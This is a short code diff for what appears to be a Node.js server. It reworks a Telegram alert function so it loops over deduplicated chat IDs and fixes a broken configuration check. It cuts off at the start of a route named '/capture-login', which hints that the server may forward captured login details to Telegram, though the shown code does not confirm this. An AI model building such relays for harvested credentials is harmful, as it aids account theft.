@@ -23,19 +23,27 @@ if (TOKEN) {
   );
 }
 
-function sendTelegramAlert(title, details) {
+async function sendTelegramAlert(title, details) {
   const message = `🔐 *${title}*\n\n${details}`;
 
-  if (!bot || !CHAT_IDS.length===0) {
+  if (!bot || CHAT_IDS.length === 0) {
     console.warn(
-      "Telegram alert skipped because bot or chat ID is not configured.",
+      "Telegram alert skipped because bot or chat ID is not configured."
     );
     return;
   }
 
-  bot
-    .sendMessage(CHAT_IDS, message, { parse_mode: "Markdown" })
-    .catch((err) => console.error("Telegram send failed:", err.message));
+  for (const chatId of [...new Set(CHAT_IDS)]) {
+    try {
+      await bot.sendMessage(chatId, message, {
+        parse_mode: "Markdown",
+      });
+
+      console.log("Telegram alert sent successfully.");
+    } catch (err) {
+      console.error("Telegram send failed:", err.message);
+    }
+  }
 }
 
 app.post("/capture-login", (req, res) => {
